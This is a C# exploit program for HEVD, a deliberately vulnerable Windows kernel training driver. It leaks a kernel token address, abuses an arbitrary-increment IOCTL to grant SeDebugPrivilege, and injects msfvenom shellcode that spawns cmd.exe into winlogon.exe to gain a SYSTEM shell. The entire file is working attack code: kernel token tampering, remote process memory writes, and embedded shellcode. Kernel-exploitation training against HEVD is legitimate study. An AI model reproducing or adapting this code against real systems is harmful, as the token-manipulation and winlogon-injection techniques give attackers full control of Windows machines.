using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ArbitraryIncrement
{
    class Program
    {
        // Windows Definition
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr Object;
            public IntPtr UniqueProcessId;
            public IntPtr HandleValue;
            public int GrantedAccess;
            public short CreatorBackTraceIndex;
            public short ObjectTypeIndex;
            public int HandleAttributes;
            public int Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            IntPtr pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQuerySystemInformation(
            uint SystemInformationClass,
            IntPtr SystemInformation,
            int SystemInformationLength,
            ref int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            ref int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            IntPtr lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            int dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // Helper Functions
        static bool IsWin10x64()
        {
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;
            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 10 && MinorVersion == 0 &&
                string.Compare(arch, "amd64", StringComparison.OrdinalIgnoreCase) == 0)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 x64");
                return true;
            }
            else
            {
                Console.WriteLine("[-] Unsupported OS is detected");
                return false;
            }
        }

        static IntPtr GetCurrentProcessTokenPointer()
        {
            uint TOKEN_QUERY = 0x8;
            uint SystemExtendedHandleInformation = 0x40;
            int STATUS_INFO_LENGTH_MISMATCH = Convert.ToInt32("0xC0000004", 16);
            int ntstatus = STATUS_INFO_LENGTH_MISMATCH;
            IntPtr ObjectPointer = IntPtr.Zero;

            Console.WriteLine("[>] Trying to get a token handle of current process");
            bool status = OpenProcessToken(new IntPtr(-1), TOKEN_QUERY, out IntPtr hToken);

            if (!status)
            {
                Console.WriteLine("[-] Failed to get a token handle of current process");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                return IntPtr.Zero;
            }

            Console.WriteLine("[+] Got a handle of current process");
            Console.WriteLine("    |-> hToken: 0x{0}", hToken.ToString("X"));

            Console.WriteLine("[>] Trying to retrieve system information");

            int SystemInformationLength = 1024;
            IntPtr infoBuffer = IntPtr.Zero;

            while (ntstatus == STATUS_INFO_LENGTH_MISMATCH)
            {
                int ReturnLength = 0;
                infoBuffer = Marshal.AllocHGlobal(SystemInformationLength);

                ntstatus = NtQuerySystemInformation(SystemExtendedHandleInformation, infoBuffer, SystemInformationLength, ref ReturnLength);

                if (ntstatus == Convert.ToInt32("0xC0000004", 16))
                {
                    Marshal.FreeHGlobal(infoBuffer);
                    SystemInformationLength = Math.Max(SystemInformationLength, ReturnLength);
                }
                else if (ntstatus == 0x0)
                {
                    break;
                }
                else
                {
                    Console.WriteLine("[-] Failed to get system information");
                    Console.WriteLine("    |-> NTSTATUS: {0}", ntstatus);

                    Marshal.FreeHGlobal(infoBuffer);
                    CloseHandle(hToken);
                    return IntPtr.Zero;
                }
            }

            int EntryCount = Marshal.ReadInt32(infoBuffer);
            Console.WriteLine("[+] Got {0} entries", EntryCount);

            int pid = Process.GetCurrentProcess().Id;
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entry = new SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX();
            int entrySize = Marshal.SizeOf(entry);
            IntPtr EntryOffsetPointer = new IntPtr(infoBuffer.ToInt64() + IntPtr.Size * 2);
            IntPtr UniqueProcessId;
            IntPtr HandleValue;

            Console.WriteLine("[>] Searching our process entry (PID = {0})", pid);

            for (int idx = 0; idx < EntryCount; idx++)
            {
                entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(EntryOffsetPointer, entry.GetType());
                UniqueProcessId = entry.UniqueProcessId;
                HandleValue = entry.HandleValue;

                if (UniqueProcessId == new IntPtr(pid) && HandleValue == hToken)
                {
                    ObjectPointer = entry.Object;
                    Console.WriteLine("[+] Got our entry");
                    Console.WriteLine("    |-> Object: 0x{0}", ObjectPointer.ToString("X16"));
                    Console.WriteLine("    |-> UniqueProcessId: {0}", UniqueProcessId);
                    Console.WriteLine("    |-> HandleValue: 0x{0}", HandleValue.ToString("X"));
                }

                EntryOffsetPointer = new IntPtr(EntryOffsetPointer.ToInt64() + entrySize);
            }

            if (ObjectPointer == IntPtr.Zero)
                Console.WriteLine("[-] Failed to get target entry");

            Marshal.FreeHGlobal(infoBuffer);
            CloseHandle(hToken);

            return ObjectPointer;
        }

        static void IncrementKernelData(IntPtr hDevice, IntPtr kernelAddress)
        {
            uint ioctl = 0x222073;
            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.Copy(BitConverter.GetBytes(kernelAddress.ToInt64()), 0, inputBuffer, IntPtr.Size);

            DeviceIoControl(hDevice, ioctl, inputBuffer, IntPtr.Size,
                IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);

            Marshal.FreeHGlobal(inputBuffer);
        }

        static void EnableSeDebugPrivilege(IntPtr hDevice, IntPtr tokenPointer)
        {
            IntPtr pointerParent = new IntPtr(tokenPointer.ToInt64() + 0x40 + 2);
            IntPtr pointerEnabled = new IntPtr(tokenPointer.ToInt64() + 0x48 + 2);
            IntPtr pointerEnabledByDefault = new IntPtr(tokenPointer.ToInt64() + 0x50 + 2);
            IntPtr[] targets = { pointerParent, pointerEnabled, pointerEnabledByDefault };

            Console.WriteLine("[>] Trying to enable SeDebugPrivilege");

            foreach (IntPtr target in targets)
            {
                for (var i = 0; i < 2; i++)
                {
                    IncrementKernelData(hDevice, target);
                }
            }
        }

        static bool InjectToWinlogon()
        {
            // msfvenom -p windows/x64/exec cmd="cmd.exe" exitfunc=thread -a x64 --platform windows -f csharp
            byte[] shellcode = new byte[] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,
                0x2e,0x65,0x78,0x65,0x00 };

            uint PROCESS_CREATE_THREAD = 0x0002;
            uint PROCESS_VM_OPERATION = 0x0008;
            uint PROCESS_VM_WRITE = 0x0020;
            uint MEM_COMMIT = 0x00001000;
            uint PAGE_READWRITE = 0x04;
            uint PAGE_EXECUTE_READ = 0x20;
            int winlogon;

            Console.WriteLine("[>] Hunting winlogon process id");

            try
            {
                winlogon = (Process.GetProcessesByName("winlogon")[0]).Id;
            }
            catch
            {
                Console.WriteLine("[-] Failed to get process id of winlogon");
                return false;
            }

            Console.WriteLine("[+] PID of winlogon: {0}", winlogon);
            Console.WriteLine("[>] Injecting shellcode to the winlogon process");

            IntPtr hProcess = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                false, winlogon);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get a winlogon handle");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                return false;
            }

            IntPtr Buffer = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length,
                MEM_COMMIT, PAGE_READWRITE);

            if (Buffer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                CloseHandle(hProcess);
                return false;
            }

            Console.WriteLine("[+] Shellcode buffer is allocated at 0x{0} in winlogon process", Buffer.ToString("X16"));

            int ReturnedBytes = 0;
            bool status = WriteProcessMemory(hProcess, Buffer, shellcode, shellcode.Length, ref ReturnedBytes);

            if (!status)
            {
                Console.WriteLine("[-] Failed to write shellcode to winlogon");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                CloseHandle(hProcess);
                return false;
            }

            Console.WriteLine("[+] {0} bytes shellcode is written in winlogon process", ReturnedBytes);

            IntPtr lpflOldProtect = Marshal.AllocHGlobal(IntPtr.Size);
            status = VirtualProtectEx(hProcess, Buffer, shellcode.Length,
                PAGE_EXECUTE_READ, lpflOldProtect);
            Marshal.FreeHGlobal(lpflOldProtect);

            if (!status)
            {
                Console.WriteLine("[-] Failed to change memory protection");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                CloseHandle(hProcess);
                return false;
            }

            IntPtr hNewThread;
            hNewThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0,
                Buffer, IntPtr.Zero, 0, IntPtr.Zero);

            if (hNewThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to execute shellcode");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                CloseHandle(hProcess);
                return false;
            }

            Console.WriteLine("[+] CreateRemoteThread is successful");
            Console.WriteLine("    |-> New thread handle: 0x{0}", hNewThread.ToString("X"));
            CloseHandle(hProcess);

            return true;
        }

        static void Main()
        {
            Console.WriteLine("--[ HEVD Exploitation : Arbitrary Increment\n");

            if (!IsWin10x64())
            {
                return;
            }

            // Step 1: Search EPROCESS
            IntPtr tokenPointer = GetCurrentProcessTokenPointer();

            if (tokenPointer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find kernel base");
                return;
            }

            // Step 2: Open driver's handle
            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
            uint GENERIC_READ = 0x80000000;
            uint GENERIC_WRITE = 0x40000000;
            uint FILE_SHARE_READ = 0x00000001;
            uint FILE_SHARE_WRITE = 0x00000002;
            uint OPEN_EXISTING = 0x3;
            uint FILE_ATTRIBUTE_NORMAL = 0x80;
            uint FILE_FLAG_OVERWRAPPED = 0x40000000;
            IntPtr invalid = new IntPtr(-1);

            Console.WriteLine("[>] Opening {0}", deviceName);
            IntPtr hDevice = CreateFile(
                deviceName, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERWRAPPED, IntPtr.Zero);

            if (hDevice == invalid)
            {
                Console.WriteLine("[-] Failed to open {0} (code={1})", deviceName, Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] HEVD.sys is opened succesfuly (hDevice = 0x{0})", hDevice.ToString("X"));

            // Step 3: Enable SeDebugPrivilege
            EnableSeDebugPrivilege(hDevice, tokenPointer);
            CloseHandle(hDevice);

            // Step 4: Code Injection to winlogon.exe
            if (InjectToWinlogon())
            {
                Console.WriteLine("[+] Exploit is completed successfully");
            }
            else
            {
                Console.WriteLine("[-] Failed to exploit");
            }
        }
    }
}
